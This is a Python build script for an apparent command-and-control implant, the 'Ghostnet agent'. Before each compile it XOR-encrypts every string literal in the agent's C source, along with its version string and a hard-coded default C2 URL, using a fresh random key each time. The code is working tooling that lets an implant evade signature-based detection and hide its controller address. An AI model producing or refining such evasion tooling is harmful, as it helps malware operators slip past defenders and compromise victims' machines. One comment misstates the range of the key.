#!/usr/bin/env python3
"""
Pre-build string encryptor for the Ghostnet agent.
Reads agent.c, encrypts every string literal with a per-build random XOR key,
replaces __xor_key and the __enc_* placeholder arrays, and writes agent_build.c.

Usage:
    python agent/encrypt_strings.py

Produces:
    agent/agent_build.c   — gitignored, compiled by the build step
"""

import re
import sys
import os
import random

# ── Match C string literals (but NOT char literals in single quotes) ──
# Matches L"..." or "..." where " is not preceded by '
STRING_RE = re.compile(
    r'(?<!\')(L?"(?:[^"\\]|\\.)*")',
    re.DOTALL
)

# Preprocessor/compiler strings that must NOT be encrypted
SKIP_LINE_IF = re.compile(
    r'^\s*(#|//|/\*)'
)

# Strings that should NOT be encrypted (empty, single chars that cause issues)
SKIP_VALUES = {'', '\\'}

def c_unescape(s):
    """Convert C escape sequences to actual bytes. Handles \\, \", \n, \r, \t, \\xHH, \\0."""
    result = bytearray()
    i = 0
    while i < len(s):
        if s[i] == '\\' and i + 1 < len(s):
            c = s[i + 1]
            if c == 'n':   result.append(10); i += 2
            elif c == 'r': result.append(13); i += 2
            elif c == 't': result.append(9); i += 2
            elif c == '0': result.append(0); i += 2
            elif c == '\\': result.append(92); i += 2
            elif c == '"': result.append(34); i += 2
            elif c == '\'': result.append(39); i += 2
            elif c == 'x':
                # \xHH — up to 2 hex digits
                hex_str = ''
                j = i + 2
                while j < len(s) and j < i + 4 and s[j] in '0123456789abcdefABCDEF':
                    hex_str += s[j]
                    j += 1
                if hex_str:
                    result.append(int(hex_str, 16))
                    i = j
                else:
                    result.append(ord('x') & 0xff)
                    i += 2
            else:
                # Unknown escape — keep literal
                result.append(ord(c) & 0xff)
                i += 2
        else:
            cp = ord(s[i])
            if cp > 255:
                # Encode non-ASCII as UTF-8
                for b in s[i].encode('utf-8'):
                    result.append(b)
            else:
                result.append(cp)
            i += 1
    return bytes(result)


def format_escaped_bytes(buf):
    """Convert binary bytes to a C string literal (escaped for embedding in source).
    Uses octal escapes (\\OOO) for non-printable bytes to avoid greedy hex escape issues."""
    parts = []
    for b in buf:
        if b == 10:      parts.append('\\n')
        elif b == 13:    parts.append('\\r')
        elif b == 9:     parts.append('\\t')
        elif b == 34:    parts.append('\\"')
        elif b == 92:    parts.append('\\\\')
        elif 0x20 <= b < 0x7f:
            parts.append(chr(b))
        else:
            # Octal escape \\ooo — always exactly 3 digits, terminates cleanly
            parts.append(f'\\{b:03o}')
    return '"' + ''.join(parts) + '"'


def format_hex_array(buf):
    """Format bytes as a C array initializer: 0xAB,0xCD,..."""
    return ','.join(f'0x{b:02x}' for b in buf)


def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    in_path = os.path.join(script_dir, 'agent.c')
    out_path = os.path.join(script_dir, 'agent_build.c')

    if not os.path.exists(in_path):
        print(f'ERROR: {in_path} not found')
        sys.exit(1)

    with open(in_path, 'r', encoding='utf-8', newline='') as f:
        source = f.read()

    # Per-build random XOR key
    xor_key = random.randint(33, 252)  # avoid 0x00 and printable ASCII range

    # Get the version string and C2 URL from the source
    # (read from current #define's / const arrays before encrypting)
    version_match = re.search(r'#define\s+AGENT_VERSION_STR\s+"([^"]*)"', source)
    agent_version = version_match.group(1) if version_match else "1.0.4"

    c2_match = re.search(r'#define\s+DEFAULT_C2_URL\s+"([^"]*)"', source)
    c2_url = c2_match.group(1) if c2_match else "https://ghostnet-c2.netlify.app"

    # Encrypt version and C2 URL
    enc_version = bytes(b ^ xor_key for b in agent_version.encode('utf-8'))
    enc_c2_url  = bytes(b ^ xor_key for b in c2_url.encode('utf-8'))

    # ── Process each line ──
    lines = source.split('\n')
    output = []
    skip_mode = False  # for multi-line preprocessor conditionals

    for line in lines:
        stripped = line.strip()

        # Handle multi-line preprocessor conditionals
        if stripped.endswith('\\') and SKIP_LINE_IF.match(stripped):
            output.append(line)
            skip_mode = True
            continue
        if skip_mode:
            output.append(line)
            if not stripped.endswith('\\'):
                skip_mode = False
            continue

        # Skip preprocessor directives and comment-only lines
        if SKIP_LINE_IF.match(stripped):
            output.append(line)
            continue

        # Replace string literals in this line
        def replace_str(m):
            full = m.group(0)

            # Wide string?
            is_wide = full.startswith('L')
            if is_wide:
                content = full[2:-1]  # strip L" and "
            else:
                content = full[1:-1]  # strip " and "

            if content in SKIP_VALUES:
                return full

            # Decode escape sequences to real bytes, then encrypt
            real_bytes = c_unescape(content)
            if len(real_bytes) == 0:
                return full

            encrypted = bytes(b ^ xor_key for b in real_bytes)
            enc_str = format_escaped_bytes(encrypted)

            if is_wide:
                return f'decrypt_w((const unsigned char*){enc_str}, {len(encrypted)})'
            else:
                return f'decrypt((const unsigned char*){enc_str}, {len(encrypted)})'

        new_line = STRING_RE.sub(replace_str, line)
        output.append(new_line)

    result = '\n'.join(output)

    # ── Replace placeholder arrays ──
    # XOR key
    result = result.replace(
        'static const unsigned char __xor_key = 0x00; /* placeholder — replaced by build script */',
        f'static const unsigned char __xor_key = 0x{xor_key:02x};'
    )

    # Version array
    ver_hex = format_hex_array(enc_version)
    result = re.sub(
        r'static const unsigned char __enc_version\[\] = \{[^}]*\};',
        f'static const unsigned char __enc_version[] = {{{ver_hex}}};',
        result
    )

    # C2 URL array
    c2_hex = format_hex_array(enc_c2_url)
    result = re.sub(
        r'static const unsigned char __enc_default_c2_url\[\] = \{[^}]*\};',
        f'static const unsigned char __enc_default_c2_url[] = {{{c2_hex}}};',
        result
    )

    # ── Write output ──
    with open(out_path, 'w', encoding='utf-8', newline='') as f:
        f.write(result)

    print(f'encrypt_strings: XOR key 0x{xor_key:02x}')
    print(f'  version  : {agent_version} -> {ver_hex}')
    print(f'  c2_url   : {c2_url}')
    print(f'  output   : {out_path}')


if __name__ == '__main__':
    main()
